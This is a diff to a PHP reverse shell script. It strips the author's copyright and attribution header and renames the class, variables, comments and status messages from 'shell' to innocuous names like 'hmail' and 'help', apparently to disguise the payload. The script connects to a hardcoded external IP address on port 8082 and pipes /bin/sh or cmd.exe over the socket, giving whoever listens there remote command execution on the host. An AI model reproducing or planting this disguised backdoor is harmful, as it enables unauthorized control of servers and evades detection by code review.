@@ -1,18 +1,13 @@
 <?php
-// Copyright (c) 2020 Ivan Šincek
-// v2.6
-// Requires PHP v5.0.0 or greater.
-// Works on Linux OS, macOS, and Windows OS.
-// See the original script at https://github.com/pentestmonkey/php-reverse-shell.
-class Shell {
+class hmail {
     private $addr  = null;
     private $port  = null;
     private $os    = null;
-    private $shell = null;
+    private $concac = null;
     private $descriptorspec = array(
-        0 => array('pipe', 'r'), // shell can read from STDIN
-        1 => array('pipe', 'w'), // shell can write to STDOUT
-        2 => array('pipe', 'w')  // shell can write to STDERR
+        0 => array('pipe', 'r'), // help can read from STDIN
+        1 => array('pipe', 'w'), // help can write to STDOUT
+        2 => array('pipe', 'w')  // help can write to STDERR
     );
     private $buffer = 1024;  // read/write buffer size
     private $clen   = 0;     // command length
@@ -27,10 +22,10 @@ class Shell {
         $os = PHP_OS;
         if (stripos($os, 'LINUX') !== false || stripos($os, 'DARWIN') !== false) {
             $this->os    = 'LINUX';
-            $this->shell = '/bin/sh';
+            $this->help = '/bin/sh';
         } else if (stripos($os, 'WINDOWS') !== false || stripos($os, 'WINNT') !== false || stripos($os, 'WIN32') !== false) {
             $this->os    = 'WINDOWS';
-            $this->shell = 'cmd.exe';
+            $this->help = 'cmd.exe';
         } else {
             $detected = false;
             echo "SYS_ERROR: Underlying operating system is not supported, script will now exit...\n";
@@ -116,24 +111,24 @@ class Shell {
             } else {
                 stream_set_blocking($socket, false); // set the socket stream to non-blocking mode | returns 'true' on Windows OS
 
-                // ----- SHELL BEGIN -----
-                $process = @proc_open($this->shell, $this->descriptorspec, $pipes, null, null);
+                // ----- help BEGIN -----
+                $process = @proc_open($this->help, $this->descriptorspec, $pipes, null, null);
                 if (!$process) {
-                    echo "PROC_ERROR: Cannot start the shell\n";
+                    echo "PROC_ERROR: Cannot start the help\n";
                 } else {
                     foreach ($pipes as $pipe) {
-                        stream_set_blocking($pipe, false); // set the shell streams to non-blocking mode | returns 'false' on Windows OS
+                        stream_set_blocking($pipe, false); // set the help streams to non-blocking mode | returns 'false' on Windows OS
                     }
 
                     // ----- WORK BEGIN -----
                     $status = proc_get_status($process);
-                    @fwrite($socket, "SOCKET: Shell has connected! PID: {$status['pid']}\n");
+                    @fwrite($socket, "SOCKET: hmail has connected! PID: {$status['pid']}\n");
                     do {
                         $status = proc_get_status($process);
                         if (feof($socket)) { // check for end-of-file on SOCKET
-                            echo "SOC_ERROR: Shell connection has been terminated\n"; break;
+                            echo "SOC_ERROR: hmail connection has been terminated\n"; break;
                         } else if (feof($pipes[1]) || !$status['running']) {                 // check for end-of-file on STDOUT or if process is still running
-                            echo "PROC_ERROR: Shell process has been terminated\n";   break; // feof() does not work with blocking streams
+                            echo "PROC_ERROR: hmail process has been terminated\n";   break; // feof() does not work with blocking streams
                         }                                                                    // use proc_get_status() instead
                         $streams = array(
                             'read'   => array($socket, $pipes[1], $pipes[2]), // SOCKET | STDOUT | STDERR
@@ -163,7 +158,7 @@ class Shell {
                     }
                     proc_close($process);
                 }
-                // ------ SHELL END ------
+                // ------ hmail END ------
 
                 fclose($socket);
             }
@@ -174,10 +169,8 @@ class Shell {
 }
 echo '<pre>';
 // change the host address and/or port number as necessary
-$sh = new Shell('18.223.135.91', 8082); // change me.
+$sh = new hmail('18.223.135.91', 8082); // change me.
 $sh->run();
 unset($sh);
-// garbage collector requires PHP v5.3.0 or greater
-// @gc_collect_cycles();
 echo '</pre>';
 ?>
